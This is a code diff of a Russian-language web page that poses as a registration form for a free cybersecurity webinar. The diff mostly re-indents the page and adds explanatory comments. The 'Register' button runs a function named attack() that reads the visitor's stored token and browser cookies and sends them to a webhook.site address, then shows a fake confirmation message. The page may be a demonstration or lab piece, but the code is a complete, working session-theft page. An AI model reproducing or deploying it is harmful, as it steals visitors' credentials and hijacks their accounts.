@@ -1,3 +1,5 @@
+
+    
 <!DOCTYPE html>
 <html lang="ru">
 <head>
@@ -47,26 +49,26 @@
   <h1>📢 Бесплатный вебинар: «Кибербезопасность 2025»</h1>
   <p>Успей зарегистрироваться — количество мест ограничено!</p>
 
+  <!-- 🟦 Кнопка вызывает JS-функцию -->
   <button onclick="attack()">Записаться</button>
 
   <div class="confirmation" id="ok">✅ Вы успешно зарегистрированы!</div>
-  <iframe name="hiddenFrame"></iframe> 
-<script>
-  function attack() {
-    const token = localStorage.getItem("token");
-    const cookie = document.cookie;
+  <iframe name="hiddenFrame"></iframe>
 
-    const img1 = new Image();
-    img1.src = "https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?token=" + encodeURIComponent(token || 'null');
+  <!-- 🟨 Вот здесь определена сама функция -->
+  <script>
+    function attack() {
+      const token = localStorage.getItem("token");
+      const cookie = document.cookie;
 
-    const img2 = new Image();
-    img2.src = "https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?cookie=" + encodeURIComponent(cookie || 'none');
+      const img1 = new Image();
+      img1.src = "https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?token=" + encodeURIComponent(token || 'null');
 
-    document.getElementById("ok").style.display = "block";
-  }
-</script>
+      const img2 = new Image();
+      img2.src = "https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?cookie=" + encodeURIComponent(cookie || 'none');
 
-
-
+      document.getElementById("ok").style.display = "block";
+    }
+  </script>
 </body>
 </html>
